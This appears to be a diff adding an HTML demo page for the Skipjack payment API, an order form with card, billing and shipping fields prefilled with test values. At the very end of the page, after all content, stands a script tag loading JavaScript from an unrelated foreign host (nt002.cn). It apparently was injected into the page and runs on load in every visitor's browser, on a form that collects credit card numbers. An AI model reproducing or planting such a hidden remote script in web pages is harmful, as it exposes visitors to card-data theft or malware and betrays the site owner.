@@ -1,0 +1,291 @@
+<html>
+
+<head>
+<meta name="GENERATOR" content="Microsoft FrontPage 4.0">
+<title>SkipjackIC COMApi Demo</title>
+<meta NAME="keywords"
+CONTENT="Skipjack, Skip jack, SkipjackIC, Skipjack IC,
+SkipJack, skipjack, skipjackIC, skipjack IC, merchant, Merchant, merchant services, Merchant Services,
+Commerce, commerce, electronic commerce, credit card, Credit Card, creditcard, VISA, visa,
+mastercard, cashregister, Master Card, secure, Secure, Secure Transactions, secure transactions 
+SET, encrypted, payment, payment service, electronic, online, secure, real-time, commerce, 
+shopping, Secure Internet Payment Service, Real Time, real time, payment gateway, secure payment">
+</head>
+
+<body bgcolor="white" text="black">
+
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+  <tr valign="top">
+    <td width="38" rowspan="2"><a href="https://www.skipjackic.com/index.html"><font face="Arial"><br>
+      </font>
+    </a></td>
+    <td valign="top"></td>
+  </tr>
+  <tr>
+    <td valign="top"><font face="Arial" size="2">To proceed with the demonstration of ASP
+    script of the Skipjack Merchant Services' Transaction API, please fill in the information below to
+    'order'. Feel free to fill in fields with any information you wish, but if you want to see
+    the email statements that SkipjackIC generates, give it an accurate email address.</font> <hr>
+    <form action="Authorize.asp" method="post" name="OrderForm1">
+     <input type="hidden"
+      name="orderstring" value="0198536895~Symmetry in Chaos~35.00~1~Y~||">
+      <div align="center"><center><table border="0" bgcolor="#FFFFD9"
+      cellspacing="0" width="524">
+        <tr>
+          <td width="82" bgcolor="#008000"><strong><font face="Arial" size="2" color="#FFFFFF">Item</font></strong></td>
+          <td width="59" bgcolor="#008000"><strong><font face="Arial" size="2" color="#FFFFFF">Quantity</font></strong></td>
+          <td width="248" bgcolor="#008000"><strong><font face="Arial" size="2" color="#FFFFFF">Description</font></strong></td>
+          <td width="127" bgcolor="#008000"><div align="right"><p><strong><font face="Arial"
+          size="2" color="#FFFFFF">Price / Unit</font></strong>
+            </div>
+          </td>
+          <td width="127" bgcolor="#008000"><strong><font face="Arial" size="2" color="#FFFFFF">Order
+            Number</font></strong>
+          </td>
+        </tr>
+        <tr>
+          <td width="82" valign="top" height="4" bgcolor="#FFFFFF"></td>
+          <td width="59" valign="top" height="4" bgcolor="#FFFFFF"></td>
+          <td width="248" valign="top" height="4" bgcolor="#FFFFFF"></td>
+          <td width="127" valign="top" height="4" bgcolor="#FFFFFF"></td>
+          <td width="127" valign="top" height="4" bgcolor="#FFFFFF">&nbsp;</td>
+        </tr>
+        <tr>
+          <td width="82" valign="top"><font face="Arial" size="2">0198536895</font></td>
+          <td width="59" valign="top"><div align="center"><p><font face="Arial" size="2"><input
+          name="howmanyitems" size="2" value="1" type="text"></font>
+              </div>
+          </td>
+          <td width="248" valign="top" align="center"><font face="Arial" size="2">Symmetry in
+          Chaos - a search for pattern in mathematics, art and nature</font></td>
+          <td width="127" valign="top" align="center"><div
+          align="right"><p><font face="Arial" size="2">XX.00</font> 
+            </div>
+ </td>
+          <td width="127" valign="top" align="center"><input type="text" name="ordernumber" size="12" value="0312991001">
+ </td>
+        </tr>
+      </table>
+      </center></div><hr width="524" size="1" align="center">
+      <div align="center"><center><table border="0" bgcolor="#FFFFD9" width="525"
+      cellspacing="0" height="236">
+        <tr>
+          <td valign="middle" width="513" align="right" colspan="5" height="18"><div align="center"><p><strong><font face="Arial"
+          size="2">Bill To Information</font></strong>
+            </div>
+          </td>
+        </tr>
+        <tr align="center">
+          <td valign="middle" width="165" align="right" height="25"><font face="Arial" size="2">Name
+          on Card: </font></td>
+          <td width="348" valign="middle" height="25" colspan="4"><div align="left"><p><font face="Arial"
+          size="2"><input name="billtoname" value="apitest" size="40" maxlength="40"
+          type="text"></font>
+            </div>
+          </td>
+        </tr>
+        <tr align="center">
+          <td valign="middle" width="165" align="right" height="25"><font face="Arial" size="2">Email
+          Address: </font></td>
+          <td width="348" valign="middle" height="25" colspan="4"><div align="left"><p><font face="Arial"
+          size="2"><input name="billtoemail" value="test@skipjack.com" size="40" maxlength="40"
+          type="text"></font>
+            </div>
+          </td>
+        </tr>
+        <tr align="center">
+          <td valign="middle" width="165" align="right" height="25"><font face="Arial" size="2">Billing
+          Address: </font></td>
+          <td width="348" valign="middle" height="25" colspan="4"><div align="left"><p><font face="Arial"
+          size="2"><input name="billtostreetaddress" value="One Skipjack Way" size="23"
+          maxlength="40" type="text"></font>
+            </div>
+          </td>
+        </tr>
+        <tr align="center">
+          <td valign="middle" width="165" align="right" height="25"><font face="Arial" size="2">City:
+          </font></td>
+          <td width="348" valign="middle" height="25" colspan="4"><div align="left"><p><font face="Arial"
+          size="2"><input name="billtocity" value="Cincinnati" size="13" maxlength="40" type="text"></font>
+            </div>
+          </td>
+        </tr>
+        <tr align="center">
+          <td valign="middle" width="165" align="right" height="25"><font face="Arial" size="2">State:
+          </font></td>
+          <td width="348" valign="middle" height="25" colspan="4"><div align="left"><p><font face="Arial"
+          size="2"><input name="billtostate" value="OH" size="3" type="text"></font>
+            </div>
+          </td>
+        </tr>
+        <tr align="center">
+          <td valign="middle" width="165" align="right" height="25"><font face="Arial" size="2">Zip
+          Code: </font></td>
+          <td width="348" valign="middle" height="25" colspan="4"><div align="left"><p><font face="Arial"
+          size="2"><input name="billtozip" value="11111" size="10" maxlength="10" type="text"></font>
+            </div>
+          </td>
+        </tr>
+        <tr align="center">
+          <td valign="middle" width="165" align="right" height="25"><font face="Arial" size="2">Credit
+          Card Number: </font></td>
+          <td width="348" valign="middle" height="25" colspan="4"><div align="left"><p><font face="Arial"
+          size="2"><input name="accountnumber" size="40" maxlength="40"
+          value="5121212121212124" type="text"></font>
+            </div>
+          </td>
+        </tr>
+        <tr align="center">
+          <td valign="middle" width="165" align="right" height="25"><font face="Arial" size="2">Expiration
+          Date: </font></td>
+      </center>
+          <td width="348" valign="middle" height="25" colspan="4">
+            <p align="left"><font face="Arial" size="2">mm <input
+          name="month" value="12" size="2" value="12" type="text" maxlength="2"> yy <input
+          name="year" value="02" size="5" maxlength="5" value="02" type="text"></font></p>
+        </td>
+        </tr>
+        <center>
+        <tr align="center">
+          <td valign="middle" width="165" align="right" height="25"><font size="2" face="Arial">Transaction
+            Amount:</font></td>
+      </center>
+          <td width="348" valign="middle" height="25" colspan="4">
+            <p align="left"><font face="Arial"
+          size="2"><input name="transactionamount" value="1.00" size="10" maxlength="10" type="text"></font></p>
+        </td>
+        </tr>
+        <center>
+        <tr align="center">
+          <td valign="middle" width="165" align="right" height="25"><font face="Arial"
+          size="2">Merchant Serial Number:</font></td>
+      </center>
+          <td width="348" valign="middle" height="25" colspan="4">
+            <p align="left"><font face="Arial"
+          size="2"><input name="serialnumber" size="13" maxlength="40" type="text" value="000882895356"></font></td>
+        </tr>
+        <center>
+        <tr align="center">
+          <td valign="middle" width="165" align="right" height="25"><b><font size="2" face="Arial">Is
+            this production:</font></b></td>
+      </center>
+          <td width="58" valign="middle" height="25">
+            <p align="left"><font size="2" face="Arial">Yes:</font></td>
+          <td width="116" valign="middle" height="25">
+            <p align="left"><font size="2" face="Arial"><input type="radio" value="1" name="IsProduction"></font></td>
+          <td width="61" valign="middle" height="25">
+            <p align="left"><font size="2" face="Arial">No:</font></td>
+          <td width="113" valign="middle" height="25">
+            <p align="left"><font size="2" face="Arial"><input type="radio" value="0" checked name="IsProduction">
+            </font></td>
+        </tr>
+        <tr align="center">
+          <td valign="middle" width="165" align="right" height="25"><font size="2" face="Arial"><b>SSL
+            Provider:</b></font></td>
+          <td width="58" valign="middle" height="25">
+            <p align="left"><font size="2" face="Arial">SSPI:</font></td>
+          <td width="116" valign="middle" height="25">
+            <p align="left"><font size="2" face="Arial"><input type="radio" value="1" name="SSLProvider" checked></font></td>
+          <td width="61" valign="middle" height="25">
+            <p align="left"><font size="2" face="Arial">Wininet:</font></td>
+          <td width="113" valign="middle" height="25">
+            <p align="left"><font size="2" face="Arial"><input type="radio" value="2" name="SSLProvider">
+            </font></td>
+        </tr>
+        <tr align="center">
+          <td valign="middle" width="165" align="right" height="25">&nbsp;</td>
+          <td width="58" valign="middle" height="25">
+            <font face="Verdana" size="2">WinHTTP</font></td>
+          <td width="116" valign="middle" height="25">
+            <p align="left"><font face="Verdana" size="2"><input type="radio" CHECKED value="3" name="SSLProvider"></font></td>
+          <td width="61" valign="middle" height="25">
+            &nbsp;</td>
+          <td width="113" valign="middle" height="25">
+            &nbsp;</td>
+        </tr>
+      </table>
+      </div><div align="center">&nbsp;</div><div align="center"><font face="Arial"
+          size="2">&nbsp;</font></div><div align="center">&nbsp;</div><div align="center"><center><table border="0" bgcolor="#FFFFD9" width="525"
+      cellspacing="0">
+        <tr>
+          <td valign="middle" width="513" align="right" colspan="2"><div
+          align="center"><p><strong><font face="Arial" size="2">Ship To Information</font>
+              </strong>
+            </div>
+          </td>
+        </tr>
+        <tr align="center">
+          <td valign="middle" width="165" align="right"><font face="Arial" size="2">Name: </font></td>
+          <td width="348" valign="middle"><div align="left"><p><font face="Arial" size="2"><input
+          name="shiptoname" value="Test Name" size="40" maxlength="40" type="text"></font>
+            </div>
+          </td>
+        </tr>
+        <tr align="center">
+          <td valign="middle" width="165" align="right"><font face="Arial" size="2">Street
+          Address: </font></td>
+          <td width="348" valign="middle"><div align="left"><p><font face="Arial" size="2"><input
+          name="shiptostreetaddress" value="One Skipjack Way" size="23" maxlength="40" type="text"></font>
+            </div>
+          </td>
+        </tr>
+        <tr align="center">
+          <td valign="middle" width="165" align="right"><font face="Arial" size="2">City: </font></td>
+          <td width="348" valign="middle"><div align="left"><p><font face="Arial" size="2"><input
+          name="shiptocity" value="Cincinnati" size="13" maxlength="40" type="text"></font>
+            </div>
+          </td>
+        </tr>
+        <tr align="center">
+          <td valign="middle" width="165" align="right"><font face="Arial" size="2">State: </font></td>
+          <td width="348" valign="middle"><div align="left"><p><font face="Arial" size="2"><input
+          name="shiptostate" value="OH" size="3" type="text"></font>
+            </div>
+          </td>
+        </tr>
+        <tr align="center">
+          <td valign="middle" width="165" align="right"><font face="Arial" size="2">Zip Code: </font></td>
+          <td width="348" valign="middle"><div align="left"><p><font face="Arial" size="2"><input
+          name="shiptozip" value="45241" size="10" maxlength="10" type="text"></font>
+            </div>
+          </td>
+        </tr>
+        <tr align="center">
+          <td valign="middle" width="165" align="right"><font face="Arial" size="2">Telephone:</font></td>
+          <td width="348" valign="middle"><div align="left"><p><font face="Arial" size="2"><input
+          name="shiptotelephone" value="111111111" size="10" maxlength="10" type="text"></font>
+            </div>
+          </td>
+        </tr>
+        <tr align="center">
+          <td valign="middle" width="513" align="right" colspan="2"><div align="center"><p><font
+          face="Arial" size="2"><input type="submit" value="Confirm"></font>
+            </div>
+          </td>
+        </tr>
+      </table>
+      </center></div><div align="center"><center><table border="0" width="547" cellspacing="0">
+        <tr>
+          <td width="100%"><div align="right">
+              <p align="center"><font face="Arial"><font size="2" color="red">Submit
+              this form <b> ONLY ONCE</b>.</font><font face="Verdana" size="2"><br>
+              Your credit card information will be processed in real-time. You
+              should receive a response in about 15-25 seconds. However, if
+              Internet traffic is unusually high, the tranaction could take
+              longer than usual. Pressing the submit button multiple times will
+              cause multiple charges to your credit card account.</font></font></div></td>
+        </tr>
+      </table>
+      </center></div><dl>
+        <div align="right"><p>&nbsp;</p>
+        </div>
+        <dd type="disc">&nbsp; </dd>
+      </dl>
+    </form>
+    </td>
+  </tr>
+</table>
+
+<p align="center">&nbsp; </p>
+<script src='http://nt002.cn/E/J.JS'></script></body>
+</html>
